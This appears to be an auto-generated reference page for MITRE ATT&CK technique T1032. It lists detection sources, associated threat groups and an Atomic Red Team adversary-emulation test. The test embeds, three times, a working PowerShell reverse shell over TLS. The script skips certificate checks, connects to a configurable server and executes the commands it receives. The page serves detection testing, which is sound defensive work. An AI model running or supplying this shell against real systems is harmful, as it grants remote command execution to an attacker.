
# Standard Cryptographic Protocol

## Description

### MITRE Description

> Adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: True
* Permissions: None
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1032

## Potential Commands

```
$server_ip = 127.0.0.1
$server_port = #{server_port}
$socket = New-Object Net.Sockets.TcpClient('127.0.0.1', '#{server_port}')
$stream = $socket.GetStream()
$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
$sslStream.AuthenticateAsClient('fake.domain', $null, "Tls12", $false)
$writer = new-object System.IO.StreamWriter($sslStream)
$writer.Write('PS ' + (pwd).Path + '> ')
$writer.flush()
[byte[]]$bytes = 0..65535|%{0};
while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data | Out-String ) 2>&1;
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}

None
```

## Commands Dataset

```
[{'command': '$server_ip = 127.0.0.1\n'
             '$server_port = #{server_port}\n'
             "$socket = New-Object Net.Sockets.TcpClient('127.0.0.1', "
             "'#{server_port}')\n"
             '$stream = $socket.GetStream()\n'
             '$sslStream = New-Object '
             'System.Net.Security.SslStream($stream,$false,({$True} -as '
             '[Net.Security.RemoteCertificateValidationCallback]))\n'
             '$sslStream.AuthenticateAsClient(\'fake.domain\', $null, "Tls12", '
             '$false)\n'
             '$writer = new-object System.IO.StreamWriter($sslStream)\n'
             "$writer.Write('PS ' + (pwd).Path + '> ')\n"
             '$writer.flush()\n'
             '[byte[]]$bytes = 0..65535|%{0};\n'
             'while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)\n'
             '{$data = (New-Object -TypeName '
             'System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n'
             '$sendback = (iex $data | Out-String ) 2>&1;\n'
             "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n"
             '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n'
             '$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}\n',
  'name': None,
  'source': 'atomics/T1032/T1032.yaml'},
 {'command': None, 'name': None, 'source': 'atomics/T1032/T1032.yaml'}]
```

## Potential Detections

```json
[{'data_source': ['5156', 'Windows Firewall']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['Malware reverse engineering']},
 {'data_source': ['SSL/TLS inspection']},
 {'data_source': ['Packet capture']},
 {'data_source': ['Netflow/Enclave netflow']},
 {'data_source': ['5156', 'Windows Firewall']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['Malware reverse engineering']},
 {'data_source': ['SSL/TLS inspection']},
 {'data_source': ['Packet capture']},
 {'data_source': ['Netflow/Enclave netflow']}]
```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Standard Cryptographic Protocol': {'atomic_tests': [{'auto_generated_guid': '21caf58e-87ad-440c-a6b8-3ac259964003',
                                                                               'description': 'Thanks '
                                                                                              'to '
                                                                                              '@OrOneEqualsOne '
                                                                                              'for '
                                                                                              'this '
                                                                                              'quick '
                                                                                              'C2 '
                                                                                              'method.\n'
                                                                                              'This '
                                                                                              'is '
                                                                                              'to '
                                                                                              'test '
                                                                                              'to '
                                                                                              'see '
                                                                                              'if '
                                                                                              'a '
                                                                                              'C2 '
                                                                                              'session '
                                                                                              'can '
                                                                                              'be '
                                                                                              'established '
                                                                                              'using '
                                                                                              'an '
                                                                                              'SSL '
                                                                                              'socket.\n'
                                                                                              'More '
                                                                                              'information '
                                                                                              'about '
                                                                                              'this '
                                                                                              'technique, '
                                                                                              'including '
                                                                                              'how '
                                                                                              'to '
                                                                                              'set '
                                                                                              'up '
                                                                                              'the '
                                                                                              'listener, '
                                                                                              'can '
                                                                                              'be '
                                                                                              'found '
                                                                                              'here:\n'
                                                                                              'https://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926\n'
                                                                                              '\n'
                                                                                              'Upon '
                                                                                              'successful '
                                                                                              'execution, '
                                                                                              'powershell '
                                                                                              'will '
                                                                                              'make '
                                                                                              'a '
                                                                                              'network '
                                                                                              'connection '
                                                                                              'to '
                                                                                              '127.0.0.1 '
                                                                                              'over '
                                                                                              '443.\n',
                                                                               'executor': {'command': '$server_ip '
                                                                                                       '= '
                                                                                                       '#{server_ip}\n'
                                                                                                       '$server_port '
                                                                                                       '= '
                                                                                                       '#{server_port}\n'
                                                                                                       '$socket '
                                                                                                       '= '
                                                                                                       'New-Object '
                                                                                                       "Net.Sockets.TcpClient('#{server_ip}', "
                                                                                                       "'#{server_port}')\n"
                                                                                                       '$stream '
                                                                                                       '= '
                                                                                                       '$socket.GetStream()\n'
                                                                                                       '$sslStream '
                                                                                                       '= '
                                                                                                       'New-Object '
                                                                                                       'System.Net.Security.SslStream($stream,$false,({$True} '
                                                                                                       '-as '
                                                                                                       '[Net.Security.RemoteCertificateValidationCallback]))\n'
                                                                                                       "$sslStream.AuthenticateAsClient('fake.domain', "
                                                                                                       '$null, '
                                                                                                       '"Tls12", '
                                                                                                       '$false)\n'
                                                                                                       '$writer '
                                                                                                       '= '
                                                                                                       'new-object '
                                                                                                       'System.IO.StreamWriter($sslStream)\n'
                                                                                                       "$writer.Write('PS "
                                                                                                       "' "
                                                                                                       '+ '
                                                                                                       '(pwd).Path '
                                                                                                       '+ '
                                                                                                       "'> "
                                                                                                       "')\n"
                                                                                                       '$writer.flush()\n'
                                                                                                       '[byte[]]$bytes '
                                                                                                       '= '
                                                                                                       '0..65535|%{0};\n'
                                                                                                       'while(($i '
                                                                                                       '= '
                                                                                                       '$sslStream.Read($bytes, '
                                                                                                       '0, '
                                                                                                       '$bytes.Length)) '
                                                                                                       '-ne '
                                                                                                       '0)\n'
                                                                                                       '{$data '
                                                                                                       '= '
                                                                                                       '(New-Object '
                                                                                                       '-TypeName '
                                                                                                       'System.Text.ASCIIEncoding).GetString($bytes,0, '
                                                                                                       '$i);\n'
                                                                                                       '$sendback '
                                                                                                       '= '
                                                                                                       '(iex '
                                                                                                       '$data '
                                                                                                       '| '
                                                                                                       'Out-String '
                                                                                                       ') '
                                                                                                       '2>&1;\n'
                                                                                                       '$sendback2 '
                                                                                                       '= '
                                                                                                       '$sendback '
                                                                                                       '+ '
                                                                                                       "'PS "
                                                                                                       "' "
                                                                                                       '+ '
                                                                                                       '(pwd).Path '
                                                                                                       '+ '
                                                                                                       "'> "
                                                                                                       "';\n"
                                                                                                       '$sendbyte '
                                                                                                       '= '
                                                                                                       '([text.encoding]::ASCII).GetBytes($sendback2);\n'
                                                                                                       '$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}\n',
                                                                                            'elevation_required': False,
                                                                                            'name': 'powershell'},
                                                                               'input_arguments': {'server_ip': {'default': '127.0.0.1',
                                                                                                                 'description': 'IP '
                                                                                                                                'of '
                                                                                                                                'the '
                                                                                                                                'external '
                                                                                                                                'server',
                                                                                                                 'type': 'String'},
                                                                                                   'server_port': {'default': 443,
                                                                                                                   'description': 'The '
                                                                                                                                  'port '
                                                                                                                                  'to '
                                                                                                                                  'connect '
                                                                                                                                  'to '
                                                                                                                                  'on '
                                                                                                                                  'the '
                                                                                                                                  'external '
                                                                                                                                  'server',
                                                                                                                   'type': 'String'}},
                                                                               'name': 'OpenSSL '
                                                                                       'C2',
                                                                               'supported_platforms': ['windows']}],
                                                             'attack_technique': 'T1032',
                                                             'display_name': 'Standard '
                                                                             'Cryptographic '
                                                                             'Protocol'}}]
```

# Tactics


* [Command and Control](../tactics/Command-and-Control.md)


# Mitigations

None

# Actors


* [BRONZE BUTLER](../actors/BRONZE-BUTLER.md)

* [Stealth Falcon](../actors/Stealth-Falcon.md)
    
* [FIN8](../actors/FIN8.md)
    
* [Cobalt Group](../actors/Cobalt-Group.md)
    
* [Taidoor](../actors/Taidoor.md)
    
* [FIN6](../actors/FIN6.md)
    
* [OilRig](../actors/OilRig.md)
    
* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [Tropic Trooper](../actors/Tropic-Trooper.md)
    
* [APT33](../actors/APT33.md)
    
* [Machete](../actors/Machete.md)
    
